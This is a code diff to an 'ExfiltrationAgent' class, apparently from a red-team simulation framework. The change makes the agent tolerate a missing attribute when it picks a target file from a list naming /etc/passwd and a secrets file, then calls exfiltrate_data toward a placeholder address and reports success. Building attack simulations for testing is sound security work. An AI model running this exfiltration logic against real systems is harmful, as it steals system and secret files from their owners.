@@ -17,6 +17,10 @@ class ExfiltrationAgent(BaseRedAgent):
         dummy_files = ["/etc/passwd", "/home/user/secrets.txt"]
         
         target = self.decider(file_list=str(dummy_files))
-        self.log(f"Exfiltrating {target.priority_file}...")
-        
-        exfiltrate_data(session_id, target.priority_file, "100.x.y.z")
+        priority_file = getattr(target, 'priority_file', None) or (target and str(target))
+        self.log(f"Exfiltrating {priority_file}...")
+
+        success = exfiltrate_data(session_id, priority_file, "100.x.y.z")
+        if success:
+            return {"status": "DATA_EXFILTRATED", "file": priority_file}
+        return {"status": "FAILED"}
